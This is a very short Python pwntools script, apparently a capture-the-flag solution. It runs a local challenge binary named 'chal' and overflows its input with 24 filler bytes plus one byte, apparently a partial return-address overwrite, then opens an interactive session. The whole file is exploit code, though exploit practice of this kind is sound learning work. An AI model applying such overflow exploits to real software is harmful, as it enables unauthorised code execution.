#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./chal', checksec = False)
p = process(elf.path)

p.send(b'x' * 24 + b'\x19')

p.interactive()